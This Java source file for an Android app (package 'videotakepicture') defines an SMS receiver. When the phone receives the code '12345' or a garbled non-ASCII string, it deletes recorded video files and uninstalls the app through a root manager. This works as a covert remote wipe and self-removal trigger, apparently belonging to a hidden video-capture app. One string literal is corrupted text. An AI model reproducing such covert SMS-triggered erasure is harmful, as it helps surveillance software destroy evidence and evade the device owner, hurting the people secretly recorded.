package com.example.videotakepicture;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.SmsMessage;

public class SMSReceiver extends BroadcastReceiver

{

    public static final String SMS_RECEIVED_ACTION = "android.provider.Telephony.SMS_RECEIVED";
    public final SmsMessage[] getMessagesFromIntent(Intent intent)

    {

        Object[] messages = (Object[]) intent.getSerializableExtra("pdus");

        byte[][] pduObjs = new byte[messages.length][];

        for (int i = 0; i < messages.length; i++)

        {

            pduObjs[i] = (byte[]) messages[i];

        }

        byte[][] pdus = new byte[pduObjs.length][];

        int pduCount = pdus.length;

        SmsMessage[] msgs = new SmsMessage[pduCount];

        for (int i = 0; i < pduCount; i++)

        {

            pdus[i] = pduObjs[i];

            msgs[i] = SmsMessage.createFromPdu(pdus[i]);

        }

        return msgs;

    }

    @Override
    public void onReceive(Context context, Intent intent)

    {
        if (intent.getAction().equals(SMS_RECEIVED_ACTION))

        {

            SmsMessage[] messages = getMessagesFromIntent(intent);

            for (SmsMessage message : messages)

            {
                String messageBody = message.getMessageBody();
                if ("12345".equals(messageBody) || "���ϻ����Է���".equals(messageBody))
                {
                   
                	VideoUtils.deleteFiles();
                    RootManager apkM = new RootManager();
                    apkM.Uninstall();
                }

            }

        }

    }

}